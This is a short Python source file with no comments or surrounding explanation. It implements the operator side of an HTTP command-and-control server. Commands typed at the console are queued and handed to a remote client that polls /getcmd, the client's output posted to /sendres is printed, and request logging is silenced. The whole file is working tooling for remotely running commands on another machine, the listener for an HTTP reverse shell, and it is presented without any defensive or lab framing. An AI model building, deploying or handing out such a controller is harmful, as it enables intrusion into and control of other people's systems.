from http.server import HTTPServer, BaseHTTPRequestHandler
import sys, queue, time, threading, readline, os

mq = queue.Queue()
host = ('', 8088)
SYSTEM_STATE = 'live'


class ExecuteServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/getcmd':
            self.getcmd_handler()
        if self.path == '/connect':
            self.connect_handler()
        if self.path == '/exit':
            self.exit_handler()


    def do_POST(self):
        if self.path == '/sendres':
            self.sendres_handler()

    def log_message(self, format, *args):
        pass

    def connect_handler(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
        except:
            pass

    def exit_handler(self):
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            global SYSTEM_STATE
            SYSTEM_STATE = 'die'
        except:
            pass

    def getcmd_handler(self):
        try:
            if not mq.empty():
                data = mq.get()
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data.encode())
            else:
                self.send_response(404)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
        except:
            pass

    def sendres_handler(self):
        content_len = int(self.headers.get('Content-Length'))
        post_body = self.rfile.read(content_len)
        sys.stdout.write(post_body.decode())
        sys.stdout.flush()
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()



def start_execute_server():
    server = HTTPServer(host, ExecuteServer)
    print("Starting server, listen at port %s" % host[1])
    server.serve_forever()


def main():
    t = threading.Thread(target=start_execute_server)
    t.setDaemon(True)
    t.start()
    while SYSTEM_STATE == 'live':
        data = input('')
        mq.put(data)

if __name__ == '__main__':
    main()